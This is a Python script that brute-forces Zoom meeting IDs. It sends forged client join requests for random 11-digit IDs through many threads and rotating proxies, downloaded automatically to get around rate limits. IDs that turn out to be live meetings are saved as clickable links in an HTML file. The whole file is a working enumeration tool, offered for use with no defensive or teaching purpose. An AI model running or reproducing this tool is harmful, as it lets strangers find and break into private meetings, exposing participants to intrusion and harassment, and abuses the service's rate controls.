import requests
import random
import threading
from time import sleep
import ctypes
import sys
import json
import os

failed = 0
found = 0

text = "Made By @zer0mania in collaboration with @Thomasaung12345 on GitHub"
print(text)

with open('config.json') as f:
    data = json.load(f)

automatic = data['automatic']
proxyType = data['proxyType']
filename = data['filename']

global_lock = threading.Lock()

def check_id(id):
    proxy = {'http' if proxyType == 'http' and automatic == 'false' else 'https': f'{proxyType}://{random.choice(proxyList)}'}
    url = "https://us05www3.zoom.us:443/conf/j"
    headers = {
        "User-Agent": "Mozilla/5.0 (ZOOM.Win 10.0 x64)", 
        "Accept": "*/*", 
        "Content-Type": "multipart/form-data; boundary=------------------------e4989a6b36dcd724"
    }
    data = f"--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"clientUserSameAsWebUser\"\r\n\r\n1\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"cv\"\r\n\r\n5.10.7.6120\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"deviceId\"\r\n\r\n{id}\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\ncoolkid69@gmail.com\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"mn\"\r\n\r\n{id}\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"needWebCheckDLP\"\r\n\r\n0\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"source\"\r\n\r\nclient\r\n--------------------------e4989a6b36dcd724\r\nContent-Disposition: form-data; name=\"uname\"\r\n\r\n{id}\r\n--------------------------e4989a6b36dcd724--\r\n"
    
    try:
        print(proxy)
        response = requests.post(url, headers=headers, data=data, proxies=proxy)
    except:
        return None

    if "Meeting not existed." in response.text:
        print("You may be getting ratelimited. (if you see alot of these switch your proxies)")
        return None

    if not "zoom" in response.text:
        print(response.text)
        return False
    else:
        print(response.text)
        return True

def stats(type):
    global found, failed
    if type == "found":
        found = found + 1
    elif type == "failed":
        failed = failed + 1

def setTitle(_str):
    system = os.name
    if system == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW(_str)
    elif system == 'posix':
        sys.stdout.write(_str)
    else:
        pass

def write_to_file():
    with global_lock:
        with open("ids.html", "a") as file:
            file.write(str(threading.get_ident()))
            file.write("\n")

def readFile(filename,method):
    with open(filename,method,encoding='utf8') as f:
        content = [line.strip('\n') for line in f]
        return content

def DownloadFile(url):
    local_filename = f"{proxyType}.txt"
    r = requests.get(url)
    f = open(local_filename, 'wb')
    for chunk in r.iter_content(chunk_size=512 * 1024): 
        if chunk: # filter out keep-alive new chunks
            f.write(chunk)
    f.close()
    return local_filename

def readProxiesFile(_str):
    restartTry = True
    while restartTry:
        try:
            proxies = readFile(_str, 'r')
            restartTry = False
            return proxies
        except:
            print(f"Failed to open {_str}")
            restartTry = True

def mythread():
    while True:
        id=random.randint(80000000000, 99999999999)
        #id = str(99779844055)
        returned = check_id(id)
        if returned:
            stats("found")
            setTitle(f"Threads: {str(threading.active_count()-1)} Failed: {str(failed)} Found: {str(found)}")
            with global_lock:
                with open("ids.html", "a") as file:
                    file.write(f'\n<a class="code" target="_blank" href="https://zoom.us/j/{id}">{found}: https://zoom.us/j/{id}</a>')
                    file.write("<br>")
        else:
            stats("failed")
            setTitle(f"Threads: {str(threading.active_count()-1)} Failed: {str(failed)} Found: {str(found)}")

if not automatic == "true":
    proxyList = readProxiesFile(filename)

setTitle(f"Threads: {str(threading.active_count()-1)} Failed: {str(failed)} Found: {str(found)}")
threads = int(input("\nThreads: "))
if automatic == "true":
    proxyChoose = True
    while proxyChoose:
        proxyType = input("Select proxy type:\n[0] - http\n[1] - socks4\n[2] - socks5 > ")
        if proxyType == "0":
            proxyType = "http"
            proxyChoose = False
        elif proxyType == "1":
            proxyType = "socks4"
            proxyChoose = False
        elif proxyType == "2":
            proxyType = "socks5"
            proxyChoose = False
    print("Downloading proxies..")
    proxyList = readProxiesFile(DownloadFile(f"https://api.proxyscrape.com/v2/?request=getproxies&protocol={proxyType}&timeout=10000&country=all"))
    print("Proxies downloaded")

def main():
    for i in range(threads):
        t = threading.Thread(target=mythread)
        t.start()
        sleep(.01)

if __name__ == "__main__":
    main()
